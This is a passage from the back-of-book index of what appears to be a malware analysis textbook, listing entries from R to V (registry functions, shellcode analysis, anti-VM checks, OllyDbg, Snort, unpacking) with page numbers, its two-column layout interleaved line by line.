<p class="calibre1">Registry Editor (Regedit), 140–141</p>
<p class="calibre1">raw data, translating to Base64, </p>
<p class="calibre1">Registry filter, in procmon, 46</p>
<p class="calibre1">277–278</p>
<p class="calibre1">registry keys, 20</p>
<p class="calibre1">RC4 algorithm, 283</p>
<p class="calibre1">malware and, 42</p>
<p class="calibre1">RCPT command (SMTP), 572</p>
<p class="calibre1">references to debuggers, 356</p>
<p class="calibre1">.rdata section, in PE file, 21</p>
<p class="calibre1">\Registry\Machine strings, 549</p>
<p class="calibre1">rdtsc function, 669</p>
<p class="calibre1">RegMon tool, 43</p>
<p class="calibre1">rdtsc instruction, for timing </p>
<p class="calibre1">RegOpenKey function, 461</p>
<p class="calibre1">check, 358</p>
<p class="calibre1">RegOpenKeyEx function, 141, 142, </p>
<p class="calibre1">read breakpoints, for finding </p>
<p class="calibre1">448, 508</p>
<p class="calibre1">tail jump, 394</p>
<p class="calibre1">RegSetValueEx function, 141, 508</p>
<p class="calibre1">ReadFile function, 137, 219</p>
<p class="calibre1">Regshot, 50–51, 56, 472, 487–488</p>
<p class="calibre1">origin of handle passed to, 623</p>
<p class="calibre1">regular expressions, for identifying </p>
<p class="calibre1">ReadProcessMemory function, 460, 590</p>
<p class="calibre1">malware patterns, 631</p>
<p class="calibre1">rebasing, 88</p>
<p class="calibre1">relative addresses, vs. absolute </p>
<p class="calibre1">in OllyDbg, 184–185</p>
<p class="calibre1">addresses, in OllyDbg, </p>
<p class="calibre1">receiving data, and code analysis, 312</p>
<p class="calibre1">184–185</p>
<p class="calibre1">recovery of hidden files, 559–560</p>
<p class="calibre1">relative virtual addresses (RVAs), for </p>
<p class="calibre1">recursive function, 527</p>
<p class="calibre1">PE files, 416</p>
<p class="calibre1">recv function, 143, 144, 313, 461</p>
<p class="calibre1">ReleaseMutex function, 151</p>
<p class="calibre1">Red Pill anti-VM technique, 374–375. </p>
<p class="calibre1">.reloc section, in PE file, 22</p>
<p class="calibre1"> <i class="calibre4">See also</i> sidt instruction </p>
<p class="calibre1">remote administration tool (RAT), </p>
<p class="calibre1">(Red Pill)</p>
<p class="calibre1">233–234</p>
<p class="calibre1">reference Snort rule keyword, 305</p>
<p class="calibre1">remote hooks, 260</p>
<p class="calibre1">RegCreateKeyEx function, 448</p>
<p class="calibre1">remote machine, program receiving </p>
<p class="calibre1">RegDeleteKeyEx function, 448</p>
<p class="calibre1">commands from, 522</p>
<p class="calibre1">Regedit (Registry Editor), 140–141</p>
<p class="calibre1">remote process, VirtualAllocEx </p>
<p class="calibre1">RegGetValue function, 141</p>
<p class="calibre1">function and, 255</p>
<p class="calibre1">Regional Internet Registries </p>
<p class="calibre1">remote shell session function, 497</p>
<p class="calibre1">(RIRs), 301</p>
<p class="calibre1">remote socket, program </p>
<p class="calibre1">register operands, 69</p>
<p class="calibre1">connecting to, 727</p>
<p class="calibre1">RegisterClassEx function, 20</p>
<p class="calibre1">rep instructions, in x86 architecture, </p>
<p class="calibre1">RegisterHotKey function, 20, 461</p>
<p class="calibre1">81–83</p>
<p class="calibre1">registers, 68</p>
<p class="calibre1">REP MOVSx instruction, 536</p>
<p class="calibre1">shifting, 75</p>
<p class="calibre1">replication, operational, 308</p>
<p class="calibre1">in x64 architecture, 443</p>
<p class="calibre1">resource extraction import </p>
<p class="calibre1">in x86 architecture, 71–73</p>
<p class="calibre1">functions, 567</p>
<p class="calibre1">Registers window, in OllyDbg, 182</p>
<p class="calibre1">Resource Hacker, 25–26, 472, 482, </p>
<p class="calibre1">registries, for Internet addresses, 301</p>
<p class="calibre1">554, 596–597</p>
<p class="calibre1">Registry (Windows), 139–143</p>
<p class="calibre1">resource section</p>
<p class="calibre1">analyzing code, 141–142</p>
<p class="calibre1">executable file stored in, 555</p>
<p class="calibre1">common functions, 141</p>
<p class="calibre1">loading data from, 481</p>
<p class="calibre1">defining services, 242</p>
<p class="calibre1">resources</p>
<p class="calibre1">function for string search, 679</p>
<p class="calibre1">imports for manipulating, 600</p>
<p class="calibre1">indications of modification, 508</p>
<p class="calibre1">obfuscated with single-byte XOR </p>
<p class="calibre1">for persistence, 241–243</p>
<p class="calibre1">encoding, 609</p>
<p class="calibre1">root keys, 140</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">757</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p791"/>resources management, </p>
<p class="calibre1"> <i class="calibre4">rtutils.dll</i>, comparing trojanized and </p>
<p class="calibre1">processes for, 147</p>
<p class="calibre1">clean versions, 243</p>
<p class="calibre1">ResumeThread function, 259, 461</p>
<p class="calibre1">rule options, in Snort, 303</p>
<p class="calibre1">ret instruction, 77, 386, 409</p>
<p class="calibre1">Run subkey, for running programs </p>
<p class="calibre1">retn instruction, 342–343, 693</p>
<p class="calibre1">automatically, 140</p>
<p class="calibre1">return instruction, for tail jump, push </p>
<p class="calibre1">run trace, in OllyDbg, 193</p>
<p class="calibre1">instruction with, 399</p>
<p class="calibre1"> <i class="calibre4">rundll32.exe</i>, 42–43, 488</p>
<p class="calibre1">return pointer, abuse, 342–343</p>
<p class="calibre1">filter for process, 572</p>
<p class="calibre1">rev keyword, in Snort, 304</p>
<p class="calibre1">for running DLL malware, 42–43</p>
<p class="calibre1">reverse-engineering, 3</p>
<p class="calibre1">running process, attaching </p>
<p class="calibre1">network protocols, 53</p>
<p class="calibre1">OllyDbg to, 181</p>
<p class="calibre1">in x86 disassembly, 67–68</p>
<p class="calibre1">running services, listing, 152</p>
<p class="calibre1">reverse-engineering environment, 466</p>
<p class="calibre1">runtime linking, 15</p>
<p class="calibre1">reverse IP lookups, 301</p>
<p class="calibre1">RVAs (relative virtual addresses), for </p>
<p class="calibre1">reverse shell, 232–233</p>
<p class="calibre1">PE files, 416</p>
<p class="calibre1">analysis, 544</p>
<p class="calibre1">creating, 703</p>
<p class="calibre1"><b class="calibre3">S</b></p>
<p class="calibre1">reversible cipher, 271</p>
<p class="calibre1">safe environment, 29.  <i class="calibre4">See also</i> virtual </p>
<p class="calibre1">RFID (radio-frequency identification) </p>
<p class="calibre1">machines</p>
<p class="calibre1">tokens, 235</p>
<p class="calibre1">SafeSEH, 345</p>
<p class="calibre1">right rotation (ror), 76</p>
<p class="calibre1">SAM (Security Account Manager), </p>
<p class="calibre1">Rijndael algorithm, 618</p>
<p class="calibre1">password hashes of local user </p>
<p class="calibre1">RIP-relative addressing, 443</p>
<p class="calibre1">accounts, 236</p>
<p class="calibre1">RIRs (Regional Internet Registries), </p>
<p class="calibre1">SamIConnect function, 237, 461</p>
<p class="calibre1">301</p>
<p class="calibre1">SamIGetPrivateData function, 237, 461</p>
<p class="calibre1">Ritchie, Dennis,  <i class="calibre4">The C Programming </i></p>
<p class="calibre1">SamQueryInformationUse function, 461</p>
<p class="calibre1"> <i class="calibre4">Language</i>, 110</p>
<p class="calibre1">SamrQueryInformationUser function, 237</p>
<p class="calibre1">Robin, John, 373</p>
<p class="calibre1"> <i class="calibre4">samsrv.dll</i> library, obtaining </p>
<p class="calibre1">RobTex, 302</p>
<p class="calibre1">handle to, 237</p>
<p class="calibre1">rogue byte, 337</p>
<p class="calibre1">sandboxes, 40–42, 473</p>
<p class="calibre1">ROL encoding algorithm, 276</p>
<p class="calibre1">Sandboxie, 473</p>
<p class="calibre1">rol instruction, 76</p>
<p class="calibre1">sc command, 555</p>
<p class="calibre1">Roman Empire, Caesar cipher and, 270</p>
<p class="calibre1">scareware, 4</p>
<p class="calibre1">root key, in registry, 139</p>
<p class="calibre1">scasb instruction, 82</p>
<p class="calibre1">rootkits, 4, 221–225</p>
<p class="calibre1">scas <i class="calibre4">x</i> instruction, 81</p>
<p class="calibre1">finding, 555–556</p>
<p class="calibre1">ScoopyNG, 379</p>
<p class="calibre1">interrupts and, 225</p>
<p class="calibre1">screen capture, function for, 615</p>
<p class="calibre1">user-mode rootkits, 247–250</p>
<p class="calibre1">ScreenEA function, 105</p>
<p class="calibre1">ROR encoding algorithm, 276</p>
<p class="calibre1">scriptable debugging, in OllyDbg, </p>
<p class="calibre1">ror instruction, 76</p>
<p class="calibre1">200–201</p>
<p class="calibre1">ROT encoding algorithm, 276</p>
<p class="calibre1">scripts, IDC, 104–105</p>
<p class="calibre1">rotation, instruction for, 76</p>
<p class="calibre1">searching</p>
<p class="calibre1">.rsrc section, in PE file, 22, 25–26</p>
<p class="calibre1">default order for loading DLLs in </p>
<p class="calibre1">RtlCompareMemory function, 557–558</p>
<p class="calibre1">Windows XP, 245</p>
<p class="calibre1">RtlCreateRegistryKey function, 461, </p>
<p class="calibre1">in IDA Pro, 94–95</p>
<p class="calibre1">549, 553</p>
<p class="calibre1">for symbols, 212–213</p>
<p class="calibre1">RtlInitUnicodeString function, 219, 559</p>
<p class="calibre1">Section Hop, 391</p>
<p class="calibre1">RtlWriteRegistryValue function, 461, </p>
<p class="calibre1">Secure Hash Algorithm 1 (SHA-1), 10</p>
<p class="calibre1">549, 553</p>
<p class="calibre1"><b class="calibre3">758</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p792"/>Security Account Manager (SAM), </p>
<p class="calibre1">shared folders, 36</p>
<p class="calibre1">password hashes of local user </p>
<p class="calibre1">in VMware, 380</p>
<p class="calibre1">accounts, 236</p>
<p class="calibre1">shell, connecting pipe to output, 624</p>
<p class="calibre1">security descriptor, 246</p>
<p class="calibre1"> <i class="calibre4">Shell32.dll</i>, 20</p>
<p class="calibre1">SeDebugPrivilege privilege-escalation </p>
<p class="calibre1">shellcode</p>
<p class="calibre1">procedure, 603</p>
<p class="calibre1">64-bit version, 442</p>
<p class="calibre1">segment registers, 71</p>
<p class="calibre1">decoder with alphabetic </p>
<p class="calibre1">SEH (Structured Exception </p>
<p class="calibre1">encoding, 697</p>
<p class="calibre1">Handling), 157, 665</p>
<p class="calibre1">finding, 423–424</p>
<p class="calibre1">chain, 345</p>
<p class="calibre1">hash array, 700–701</p>
<p class="calibre1">misusing, 344–346</p>
<p class="calibre1">locating open handle to PDF, 708</p>
<p class="calibre1">Seitz, Justin,  <i class="calibre4">Gray Hat Python</i>, 201</p>
<p class="calibre1">payload, 698</p>
<p class="calibre1">self-decoding, 288–289</p>
<p class="calibre1">writing into  <i class="calibre4">cisvc.exe</i>, 583–584</p>
<p class="calibre1">self-deletion scripting code, 674</p>
<p class="calibre1">shellcode analysis, 407–424</p>
<p class="calibre1">send function, 143, 144, 313, 461</p>
<p class="calibre1">dynamic, 706–707</p>
<p class="calibre1">installing inline hook, 574</p>
<p class="calibre1">encodings, 421–422</p>
<p class="calibre1">sending data, and code analysis, 312</p>
<p class="calibre1">identifying execution location, </p>
<p class="calibre1">server side of network, 144–145</p>
<p class="calibre1">409–413</p>
<p class="calibre1">ServiceMain function, 673</p>
<p class="calibre1">labs, 425–426</p>
<p class="calibre1">services</p>
<p class="calibre1">solutions, 696–712</p>
<p class="calibre1">defining in Registry, 242</p>
<p class="calibre1">loading code for, 408</p>
<p class="calibre1">function creating, 677</p>
<p class="calibre1">manual symbol resolution, 413–418</p>
<p class="calibre1">functions indicating creation, 549</p>
<p class="calibre1">finding  <i class="calibre4">kernel32.dll</i> in memory, </p>
<p class="calibre1">handles for, OpenService </p>
<p class="calibre1">413–415</p>
<p class="calibre1">function for, 550</p>
<p class="calibre1">parsing PE export data, 415–417</p>
<p class="calibre1">malware creation, 514</p>
<p class="calibre1">using hashed exported names, </p>
<p class="calibre1">malware installed as, 487</p>
<p class="calibre1">417–418</p>
<p class="calibre1">program creating, 561</p>
<p class="calibre1">NOP sled, 422–423</p>
<p class="calibre1">sc command for information </p>
<p class="calibre1">in OllyDbg, 196–197</p>
<p class="calibre1">about, 555</p>
<p class="calibre1">position-independent code (PIC), </p>
<p class="calibre1">in Windows, 152–154</p>
<p class="calibre1">408–409</p>
<p class="calibre1">SetColor function, 105</p>
<p class="calibre1"> <i class="calibre4">shellcode_launcher.exe</i>, 408, 411, 696</p>
<p class="calibre1">setdll tool, 262</p>
<p class="calibre1">ShellExecute function, 462, 636</p>
<p class="calibre1">SetFilePointer function, 709</p>
<p class="calibre1">shifting registers, 75</p>
<p class="calibre1">SetFileTime function, 461</p>
<p class="calibre1">shl instruction, 75, 76</p>
<p class="calibre1">SetThreadContext function, 259, 461, </p>
<p class="calibre1">ShowWindow function, 20</p>
<p class="calibre1">590, 595</p>
<p class="calibre1">shr instruction, 75</p>
<p class="calibre1">SetWaitableTimer function, 516</p>
<p class="calibre1">sid keyword, in Snort, 304</p>
<p class="calibre1">SetWindowsHookEx function, 20, 239, </p>
<p class="calibre1">sidt instruction (Red Pill), 375, </p>
<p class="calibre1">260, 261, 462, 597</p>
<p class="calibre1">670, 671</p>
<p class="calibre1">SetWindowText function, 20</p>
<p class="calibre1">virtual machine and, 374</p>
<p class="calibre1">SF (sign) flag, 72</p>
<p class="calibre1">signature-based IDSs, 302</p>
<p class="calibre1"> <i class="calibre4">sfc_os.dll</i>, 604</p>
<p class="calibre1">signatures.  <i class="calibre4">See</i> network signatures</p>
<p class="calibre1">SfcTerminateWatcherThread function, </p>
<p class="calibre1">simple ciphers, 270–280</p>
<p class="calibre1">462, 604</p>
<p class="calibre1">Base64, 277–280</p>
<p class="calibre1">sgdt instruction</p>
<p class="calibre1">Caesar cipher, 270</p>
<p class="calibre1">virtual machine and, 374</p>
<p class="calibre1">other encoding schemes, 276–277</p>
<p class="calibre1">and VMware detection, 375</p>
<p class="calibre1">XOR cipher, 271–276</p>
<p class="calibre1">SHA-1 (Secure Hash Algorithm 1), 10</p>
<p class="calibre1">simple instructions, in x86 </p>
<p class="calibre1">shared files, 138</p>
<p class="calibre1">architecture, 73–76</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">759</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p793"/>single-byte XOR encoding, 271</p>
<p class="calibre1">spear-phishing, 299</p>
<p class="calibre1">single-stepping</p>
<p class="calibre1">special files, in Windows API, 138–139</p>
<p class="calibre1">in debuggers, 169–170, 176</p>
<p class="calibre1">sprintf function, annotated code for </p>
<p class="calibre1">and icebp instruction, 363</p>
<p class="calibre1">arguments, 628–629</p>
<p class="calibre1">in OllyDbg, 187</p>
<p class="calibre1">spyware, 20</p>
<p class="calibre1">sinkhole, 297</p>
<p class="calibre1">SSDT (System Service Descriptor </p>
<p class="calibre1">Size of Raw Data, 23–24</p>
<p class="calibre1">Table) </p>
<p class="calibre1">SizeOfRawData field, in PE header, 365</p>
<p class="calibre1">checking for, 222</p>
<p class="calibre1">SizeofResource function, 254, 596, 609</p>
<p class="calibre1">hooking, 221–222</p>
<p class="calibre1">sldt instruction (No Pill), 670, 672</p>
<p class="calibre1">stack, 69</p>
<p class="calibre1">and VMware detection, 375</p>
<p class="calibre1">addresses for local variables, 111</p>
<p class="calibre1">Sleep function, 239, 263, 329, 479</p>
<p class="calibre1">ExceptionHandler code and, 345</p>
<p class="calibre1">in loop, 629</p>
<p class="calibre1">fixing for function, 506–507</p>
<p class="calibre1">parameter for, 499</p>
<p class="calibre1">identifying parameters pushed </p>
<p class="calibre1">sandboxes and, 41</p>
<p class="calibre1">onto, 502–503</p>
<p class="calibre1">Sleuth Kit, The (TSK), 473</p>
<p class="calibre1">objects created on, 437</p>
<p class="calibre1">smart cards, 235</p>
<p class="calibre1">viewing in OllyDbg, 185–186</p>
<p class="calibre1">snapshots</p>
<p class="calibre1">in x64 architecture, differences in </p>
<p class="calibre1">comparing with Regshot, 50–51, 58</p>
<p class="calibre1">usage, 443–447</p>
<p class="calibre1">of registry, 487–488</p>
<p class="calibre1">in x86 architecture, 77–80</p>
<p class="calibre1">of virtual machines, 35–36</p>
<p class="calibre1">function calls, 77–78</p>
<p class="calibre1">Snort, 473</p>
<p class="calibre1">layout, 78–80</p>
<p class="calibre1">analyzing parsing routines, </p>
<p class="calibre1">stack overflow, 158</p>
<p class="calibre1">318–320</p>
<p class="calibre1">stack pointer, negative number for, 348</p>
<p class="calibre1">creating signature, 317</p>
<p class="calibre1">stack variables, automatically </p>
<p class="calibre1">false positives in, 306</p>
<p class="calibre1">naming, 100</p>
<p class="calibre1">intrusion detection with, 303–304</p>
<p class="calibre1">Stack window, in OllyDbg, 182–183</p>
<p class="calibre1">Perl Compatible Regular Expres-</p>
<p class="calibre1">stack-formed strings, decoding, </p>
<p class="calibre1">sion (PCRE) notation in, 305</p>
<p class="calibre1">540–541</p>
<p class="calibre1">signature for rule, 632</p>
<p class="calibre1">stack-frame analysis, thwarting, </p>
<p class="calibre1">targeting multiple elements, </p>
<p class="calibre1">347–349</p>
<p class="calibre1">320–321</p>
<p class="calibre1">standard back trace, in OllyDbg, </p>
<p class="calibre1">sockaddr_in structure, 543, 702</p>
<p class="calibre1">192–193</p>
<p class="calibre1">socket function, 143, 144, 313</p>
<p class="calibre1">StartAddress function, 516</p>
<p class="calibre1">symbolic constants for, 500</p>
<p class="calibre1">START_PENDING, as service status, 517</p>
<p class="calibre1">sockets</p>
<p class="calibre1">StartService function, 153, 549, </p>
<p class="calibre1">Berkeley compatible, 143–144</p>
<p class="calibre1">550, 554</p>
<p class="calibre1">code for creating, 701–702</p>
<p class="calibre1">StartServiceCtrlDispatcher function, </p>
<p class="calibre1">program connecting to remote, 727</p>
<p class="calibre1">462, 514</p>
<p class="calibre1">SoftICE, 168</p>
<p class="calibre1">STARTUPINFO structure, 148, 233</p>
<p class="calibre1">software, modifying execution with </p>
<p class="calibre1">manipulating, 544</p>
<p class="calibre1">debugger, 177</p>
<p class="calibre1">static analysis, 9–26, 65</p>
<p class="calibre1">software breakpoints, 357</p>
<p class="calibre1">advanced, 3</p>
<p class="calibre1">vs. hardware, 687</p>
<p class="calibre1">basic, 2</p>
<p class="calibre1">in OllyDbg, 188–189</p>
<p class="calibre1">combining with dynamic analysis, </p>
<p class="calibre1">Software Data Execution Prevention </p>
<p class="calibre1">307–321</p>
<p class="calibre1">Software (DEP), 345</p>
<p class="calibre1">Dependency Walker for, 468</p>
<p class="calibre1">source-level debuggers, vs. </p>
<p class="calibre1">example,  <i class="calibre4">PotentialKeylogger.exe</i>, </p>
<p class="calibre1">assembly-level, 168</p>
<p class="calibre1">18–21</p>
<p class="calibre1">spam-sending malware, 4</p>
<p class="calibre1"><b class="calibre3">760</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p794"/>labs, 27–28</p>
<p class="calibre1">strncmp function, 256, 523, 524, 715</p>
<p class="calibre1">solutions, 477–481</p>
<p class="calibre1">for module name comparison, 666</p>
<p class="calibre1">techniques, 482–485</p>
<p class="calibre1">in OllyDbg, 663</p>
<p class="calibre1">static IP addresses, 632</p>
<p class="calibre1">strncpy function, 611</p>
<p class="calibre1">static libraries, 145</p>
<p class="calibre1">strrchr function, 541, 725</p>
<p class="calibre1">static linking, 15</p>
<p class="calibre1">strstr function, 640</p>
<p class="calibre1">static unpacking programs, </p>
<p class="calibre1">Structured Exception Handling </p>
<p class="calibre1">automated, 389</p>
<p class="calibre1">(SEH), 157, 665</p>
<p class="calibre1">static values in memory, 69</p>
<p class="calibre1">chain, 345</p>
<p class="calibre1">status flags, 71</p>
<p class="calibre1">misusing, 344–346</p>
<p class="calibre1">STATUS_BREAKPOINT exception, 362</p>
<p class="calibre1">structures</p>
<p class="calibre1">stdcall calling convention, 120</p>
<p class="calibre1">applying in IDA Pro, 547–548</p>
<p class="calibre1">stepping, in OllyDbg, 187</p>
<p class="calibre1">AT_INFO, 547–548</p>
<p class="calibre1">stepping-into, in debuggers, 170–171</p>
<p class="calibre1">EPROCESS</p>
<p class="calibre1">stepping-over, in debuggers, </p>
<p class="calibre1">changing, 566</p>
<p class="calibre1">170–171, 187</p>
<p class="calibre1">examining in WinDbg, 565</p>
<p class="calibre1">Storm worm, 375</p>
<p class="calibre1">identifying, 128–130</p>
<p class="calibre1">stos <i class="calibre4">x</i> instruction, 81</p>
<p class="calibre1">InInitializationOrderLinks list of, 414</p>
<p class="calibre1">str instruction, 670, 671–672</p>
<p class="calibre1">LIST_ENTRY, 414, 565</p>
<p class="calibre1">to detect VMware, 377–378</p>
<p class="calibre1">manually checking, 353–356</p>
<p class="calibre1">and virtual machine detection, 377</p>
<p class="calibre1">Microsoft symbols and viewing </p>
<p class="calibre1">strcat function, risk in using, 421</p>
<p class="calibre1">information on, 213–214</p>
<p class="calibre1">strcpy function, risk in using, 421</p>
<p class="calibre1">overlaying data onto, 214</p>
<p class="calibre1">stricmp function, 527</p>
<p class="calibre1">sockaddr_in, 543, 702</p>
<p class="calibre1">string instructions, 81</p>
<p class="calibre1">STARTUPINFO, 148, 233, 594</p>
<p class="calibre1">strings</p>
<p class="calibre1">SYSTEMTIME, 516</p>
<p class="calibre1">comparing in Process Explorer, 49</p>
<p class="calibre1">time-related, manipulating, 516</p>
<p class="calibre1">comparison of malware names, 666</p>
<p class="calibre1">UNICODE_STRING, for Windows </p>
<p class="calibre1">concatenation functions, 535</p>
<p class="calibre1">kernel, 219</p>
<p class="calibre1">decoding stack-formed, 540–541</p>
<p class="calibre1">Structures window, in IDA Pro, 92</p>
<p class="calibre1">decoding XOR encoded, 542–543</p>
<p class="calibre1">SUB encoding algorithm, 276</p>
<p class="calibre1">finding, 11–13</p>
<p class="calibre1">sub links, in IDA Pro, 93</p>
<p class="calibre1">finding anti-VM techniques using, </p>
<p class="calibre1">subkey, in registry, 139</p>
<p class="calibre1">679–683</p>
<p class="calibre1">subtraction, instruction for, 74</p>
<p class="calibre1">functions for manipulating, 715</p>
<p class="calibre1">suspended process, resuming, 595</p>
<p class="calibre1">in malware, 487</p>
<p class="calibre1">suspended state, creating </p>
<p class="calibre1">obfuscated comparison, 640–641</p>
<p class="calibre1">process in, 258</p>
<p class="calibre1">packed files and, 483</p>
<p class="calibre1">SuspendThread function, 462</p>
<p class="calibre1">Python script for converting data </p>
<p class="calibre1">SvcHost DLLs, 242–243</p>
<p class="calibre1">to, 500–501</p>
<p class="calibre1"> <i class="calibre4">svchost.exe, </i> 257–258</p>
<p class="calibre1">recognizing in cryptographic </p>
<p class="calibre1">malware launch from, 488</p>
<p class="calibre1">algorithms, 281–282</p>
<p class="calibre1">running as orphaned process, </p>
<p class="calibre1">sending to debugger for </p>
<p class="calibre1">490–491</p>
<p class="calibre1">display, 353</p>
<p class="calibre1">switch statement, 121–126, 722–723</p>
<p class="calibre1">strings listings, identifying keyloggers </p>
<p class="calibre1">graph indicating, 509–510</p>
<p class="calibre1">in, 240–241</p>
<p class="calibre1">if style for, 122–123, 124</p>
<p class="calibre1">Strings tool, 473</p>
<p class="calibre1">jump table for, 123–126, 641–642</p>
<p class="calibre1">to search executable, 11–12</p>
<p class="calibre1">symbolic constants, for socket </p>
<p class="calibre1">Strings window, in IDA Pro, 91</p>
<p class="calibre1">function, 500</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">761</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p795"/>symbolic links, creating, 562</p>
<p class="calibre1">Thread Environment Block (TEB), 344</p>
<p class="calibre1">symbols, 212–215</p>
<p class="calibre1">thread identifiers (TID), 575–576</p>
<p class="calibre1">configuring, 215</p>
<p class="calibre1">Thread Information Block (TIB), 344</p>
<p class="calibre1">searching for, 212–213</p>
<p class="calibre1">thread local storage (TLS) callbacks, </p>
<p class="calibre1">and viewing structure information, </p>
<p class="calibre1">359–361</p>
<p class="calibre1">213–214</p>
<p class="calibre1">Thread32First function, 462</p>
<p class="calibre1">SYSCALL instruction, 158, 221</p>
<p class="calibre1">Thread32Next function, 462</p>
<p class="calibre1">SYSENTER instruction, 158</p>
<p class="calibre1">threads</p>
<p class="calibre1">Sysinternals, Autoruns program, 241</p>
<p class="calibre1">program accessing context of, 591</p>
<p class="calibre1">SYSTEM account, 152</p>
<p class="calibre1">targeting, 261</p>
<p class="calibre1">system binaries, trojanized, for </p>
<p class="calibre1">viewing in OllyDbg, 185–186</p>
<p class="calibre1">persistence, 243–244</p>
<p class="calibre1">in Windows, 149–151</p>
<p class="calibre1">system calls, filtering on, 45</p>
<p class="calibre1">ThreatExpert, 40</p>
<p class="calibre1">system function, 462</p>
<p class="calibre1">TIB (Thread Information Block), 344</p>
<p class="calibre1">system memory.  <i class="calibre4">See</i> memory</p>
<p class="calibre1">TID (thread identifiers), 575–576</p>
<p class="calibre1">system residue, checking for, 356</p>
<p class="calibre1">Time Date Stamp description, in PE </p>
<p class="calibre1">System Service Descriptor Table </p>
<p class="calibre1">file, 22–23</p>
<p class="calibre1">(SSDT)</p>
<p class="calibre1">time-related structures, </p>
<p class="calibre1">checking for, 222</p>
<p class="calibre1">manipulating, 516</p>
<p class="calibre1">hooking, 221–222</p>
<p class="calibre1">timestomping, 535</p>
<p class="calibre1">SystemFunction025 function, 237</p>
<p class="calibre1">timing checks, 357–359</p>
<p class="calibre1">SystemFunction027 function, 237</p>
<p class="calibre1">GetTickCount function, 668–669</p>
<p class="calibre1">SYSTEMTIME structure, 516</p>
<p class="calibre1">with QueryPerformanceCounter, </p>
<p class="calibre1">SystemTimeToFileTime function, 516</p>
<p class="calibre1">667–668</p>
<p class="calibre1">rdtsc function, 669</p>
<p class="calibre1"><b class="calibre3">T</b></p>
<p class="calibre1">TLS (thread local storage) callbacks, </p>
<p class="calibre1">359–361</p>
<p class="calibre1">tail jump, 386</p>
<p class="calibre1">Toolhelp32ReadProcessMemory </p>
<p class="calibre1">eliminating code as, 693</p>
<p class="calibre1">function, 462</p>
<p class="calibre1">examining code for, 687–688</p>
<p class="calibre1">Tor, 300, 474</p>
<p class="calibre1">and finding OEP, 392</p>
<p class="calibre1">tracing, in OllyDbg, 192–194</p>
<p class="calibre1">for program packed with </p>
<p class="calibre1">traffic logs, of malware activities, 312</p>
<p class="calibre1">UPack, 399</p>
<p class="calibre1">transferring files, from virtual </p>
<p class="calibre1">targeted malware, 4</p>
<p class="calibre1">machine, 36</p>
<p class="calibre1">targeted phishing, 299</p>
<p class="calibre1">trap flag, 176–177</p>
<p class="calibre1">TCP handshake, capturing, 59</p>
<p class="calibre1">trojanized system binaries, for </p>
<p class="calibre1">TCPView, 473</p>
<p class="calibre1">persistence, 243–244</p>
<p class="calibre1">TEB (Thread Environment Block), 344</p>
<p class="calibre1">Truman, 474</p>
<p class="calibre1">TerminateProcess function, IAT </p>
<p class="calibre1">TSK (The Sleuth Kit), 473</p>
<p class="calibre1">hooking of, 248</p>
<p class="calibre1">type library, loading manually in </p>
<p class="calibre1">test instruction, 80</p>
<p class="calibre1">IDA Pro, 102</p>
<p class="calibre1">text mode, in IDA Pro, 90–91</p>
<p class="calibre1">types, in Windows API, 136</p>
<p class="calibre1">.text section, in PE file, 21, 22</p>
<p class="calibre1">TF (trap) flag, 72</p>
<p class="calibre1"><b class="calibre3">U</b></p>
<p class="calibre1">The Sleuth Kit (TSK), 473</p>
<p class="calibre1">Themida, 400</p>
<p class="calibre1">u (unassemble) command, </p>
<p class="calibre1"> <i class="calibre4">Thinking in C++</i> (Eckel), 428</p>
<p class="calibre1">in WinDbg, 212</p>
<p class="calibre1">this pointer, 428–430, 712–713, 719</p>
<p class="calibre1">Ultimate Packer for eXecutables.  <i class="calibre4">See</i> </p>
<p class="calibre1">in disassembly, 430</p>
<p class="calibre1">UPX (Ultimate Packer for </p>
<p class="calibre1">thread context, 149</p>
<p class="calibre1">eXecutables)</p>
<p class="calibre1"><b class="calibre3">762</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p796"/>unconditional jump, 80, 517</p>
<p class="calibre1"> <i class="calibre4">user32.dll</i>, 17, 20, 545</p>
<p class="calibre1">undo feature, snapshots as, 35</p>
<p class="calibre1">User-Agent, 312, 317</p>
<p class="calibre1">unescape function (JavaScript), 423, </p>
<p class="calibre1">dynamically generated, 511</p>
<p class="calibre1">705–706</p>
<p class="calibre1">for malware, 303, 310, 628</p>
<p class="calibre1">unhandled exception, 344</p>
<p class="calibre1">string for signature, 643</p>
<p class="calibre1">UnhookWindowsHookEx function, 261</p>
<p class="calibre1">user-mode APC, 263</p>
<p class="calibre1">Unicode strings, 11–12</p>
<p class="calibre1">user-mode rootkits, 247–250</p>
<p class="calibre1">UNICODE_STRING structure, for Windows </p>
<p class="calibre1">IAT hooking, 248</p>
<p class="calibre1">kernel, 219</p>
<p class="calibre1">inline hooking, 248–250</p>
<p class="calibre1">uniform resource locators (URLs), </p>
<p class="calibre1">opening to download </p>
<p class="calibre1"><b class="calibre3">V</b></p>
<p class="calibre1">malware, 651–652, 654</p>
<p class="calibre1">value entry, in registry, 140</p>
<p class="calibre1">unload function, analysis in WinDbg vs. </p>
<p class="calibre1">variables, global vs. local, 110–112</p>
<p class="calibre1">IDA Pro, 553</p>
<p class="calibre1">VERA (Visualizing Executables for </p>
<p class="calibre1">UnMapViewOfSection function, 592</p>
<p class="calibre1">Reversing and Analysis), </p>
<p class="calibre1">unpacking, 14, 685–686</p>
<p class="calibre1">475–476</p>
<p class="calibre1">analyzing malware without, </p>
<p class="calibre1">victim information, malware </p>
<p class="calibre1">400–401</p>
<p class="calibre1">gathering of, 722</p>
<p class="calibre1">example, 386–387</p>
<p class="calibre1">viewing processes, with Process </p>
<p class="calibre1">manual, 389–397</p>
<p class="calibre1">Explorer, 47–50</p>
